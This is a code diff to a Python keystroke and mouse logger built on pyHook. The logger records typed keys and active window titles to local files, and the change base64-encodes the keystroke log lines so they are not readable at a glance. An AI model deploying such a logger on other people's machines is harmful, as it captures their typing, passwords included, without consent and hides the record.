@@ -5,6 +5,7 @@ import sys
 import time
 import pythoncom
 import pyHook
+import base64
 
 handle = open(r'E:\software\keyboard_keeper_log\mouse.txt', 'a')
 key_handle = open(r'E:\software\keyboard_keeper_log\keyboard.txt', 'a')
@@ -111,7 +112,9 @@ def on_keyboard_event(event):
         if len(write_line) > 0:
             cur_time = time.strftime('%Y-%m-%d %H:%M:%S')
             cur_window = key_stack[-1].window_name
-            key_handle.write(cur_time + '|' + cur_window + '---------->' + ''.join(write_line) + '\n')
+            write_str = cur_time + '|' + cur_window + '---------->' + ''.join(write_line)
+            write_str = base64.encodestring(write_str)
+            key_handle.write(write_str + '\n')
             key_handle.flush()
         key_stack = []
 
